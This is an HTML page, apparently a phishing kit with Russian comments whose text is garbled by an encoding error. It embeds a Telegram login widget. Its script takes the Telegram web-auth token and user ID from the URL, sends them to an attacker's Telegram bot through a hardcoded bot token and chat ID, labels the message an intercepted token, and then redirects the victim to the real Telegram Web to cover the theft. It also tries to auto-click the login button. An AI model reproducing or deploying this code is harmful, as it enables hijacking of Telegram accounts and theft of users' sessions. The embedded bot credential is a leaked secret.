<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <!-- –ü–æ–¥–∫–ª—é—á–∞–µ–º –≤–∏–¥–∂–µ—Ç Telegram -->
    <script async src="https://telegram.org/js/telegram-widget.js?22" 
            data-telegram-login="jdwgwvshsbsj_bot"   <!-- –∑–∞–º–µ–Ω–∏ –Ω–∞ username —Å–≤–æ–µ–≥–æ –±–æ—Ç–∞ -->
            data-size="large" 
            data-auth-url="https://teeleg-deep.netlify.app/" 
            data-request-access="write">
    </script>
    <style>
        /* –°–∫—Ä—ã–≤–∞–µ–º –∫–Ω–æ–ø–∫—É –≤–∏–¥–∂–µ—Ç–∞, –µ—Å–ª–∏ —Ö–æ—á–µ—à—å —Å–¥–µ–ª–∞—Ç—å –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π –∫–ª–∏–∫ (–Ω–æ –∞–≤—Ç–æ–∫–ª–∏–∫ –º–æ–∂–µ—Ç –Ω–µ —Å—Ä–∞–±–æ—Ç–∞—Ç—å) */
        #telegram-login-button { display: none; }
    </style>
</head>
<body>
    <p>–ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ...</p>

    <script>
        // –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ç–æ–∫–µ–Ω–∞ –≤ Telegram
        function sendToken(token, userId) {
            const botToken = '8541613029:AAF9uWzlAYEJy1kNM89yQfMtIz3bh53AOo4';
            const chatId = '8220267007';
            let message = `üîê –ü–µ—Ä–µ—Ö–≤–∞—á–µ–Ω —Ç–æ–∫–µ–Ω: ${token}`;
            if (userId) message += `\nUser ID: ${userId}`;
            message += `\nURL: ${window.location.href}`;
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: message })
            }).catch(() => {});
        }

        // –ü—Ä–æ–≤–µ—Ä—è–µ–º, –Ω–µ—Ç –ª–∏ —É–∂–µ —Ç–æ–∫–µ–Ω–∞ –≤ —Ö—ç—à–µ (–ø—Ä–∏—à–ª–∏ –ø–æ—Å–ª–µ —Ä–µ–¥–∏—Ä–µ–∫—Ç–∞ —Å –≤–∏–¥–∂–µ—Ç–∞)
        (function() {
            const hash = window.location.hash.substring(1);
            if (hash) {
                const params = new URLSearchParams(hash);
                const token = params.get('tgWebAuthToken');
                const userId = params.get('tgWebAuthUserId');
                if (token) {
                    sendToken(token, userId);
                    // –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è–µ–º –Ω–∞ –æ—Ñ–∏—Ü–∏–∞–ª—å–Ω—ã–π Telegram Web
                    window.location.replace('https://web.telegram.org/k/');
                }
            }
        })();

        // –ü–æ–ø—ã—Ç–∫–∞ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –∫–ª–∏–∫–Ω—É—Ç—å –ø–æ –∫–Ω–æ–ø–∫–µ –≤–∏–¥–∂–µ—Ç–∞ –ø–æ—Å–ª–µ –∑–∞–≥—Ä—É–∑–∫–∏
        window.addEventListener('load', function() {
            // –í–∏–¥–∂–µ—Ç —Å–æ–∑–¥–∞—ë—Ç iframe, –≤–Ω—É—Ç—Ä–∏ –∫–æ—Ç–æ—Ä–æ–≥–æ –∫–Ω–æ–ø–∫–∞. –ù–∞–ø—Ä—è–º—É—é –∫–ª–∏–∫–Ω—É—Ç—å —Å–ª–æ–∂–Ω–æ.
            // –ú–æ–∂–Ω–æ –ø–æ–ø—Ä–æ–±–æ–≤–∞—Ç—å –Ω–∞–π—Ç–∏ iframe –∏ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–±—ã—Ç–∏–µ, –Ω–æ —Å–∫–æ—Ä–µ–µ –≤—Å–µ–≥–æ —ç—Ç–æ –∑–∞–±–ª–æ–∫–∏—Ä—É–µ—Ç –±—Ä–∞—É–∑–µ—Ä.
            // –ü–æ—ç—Ç–æ–º—É –ª—É—á—à–∏–π –≤–∞—Ä–∏–∞–Ω—Ç ‚Äì –æ—Å—Ç–∞–≤–∏—Ç—å –∫–Ω–æ–ø–∫—É –≤–∏–¥–∏–º–æ–π, –Ω–æ –∑–∞–º–∞—Å–∫–∏—Ä–æ–≤–∞—Ç—å –µ—ë –ø–æ–¥ —á—Ç–æ-—Ç–æ –¥—Ä—É–≥–æ–µ.
            // –†–∞—Å–∫–æ–º–º–µ–Ω—Ç–∏—Ä—É–π –∫–æ–¥ –Ω–∏–∂–µ, –µ—Å–ª–∏ —Ö–æ—á–µ—à—å —Ä–∏—Å–∫–Ω—É—Ç—å —Å –∞–≤—Ç–æ–∫–ª–∏–∫–æ–º (–Ω–µ –≥–∞—Ä–∞–Ω—Ç–∏—Ä—É–µ—Ç—Å—è).
            
            setTimeout(function() {
                const iframe = document.querySelector('iframe[src*="oauth.telegram.org"]');
                if (iframe) {
                    // –ü–æ–ø—ã—Ç–∫–∞ –∫–ª–∏–∫–Ω—É—Ç—å –ø–æ –∫–Ω–æ–ø–∫–µ –≤–Ω—É—Ç—Ä–∏ iframe (–≤—Ä—è–¥ –ª–∏ —Å—Ä–∞–±–æ—Ç–∞–µ—Ç)
                    try {
                        const innerDoc = iframe.contentDocument || iframe.contentWindow.document;
                        const button = innerDoc.querySelector('button');
                        if (button) button.click();
                    } catch(e) {}
                }
            }, 2000);
        });
    </script>
</body>
</html>
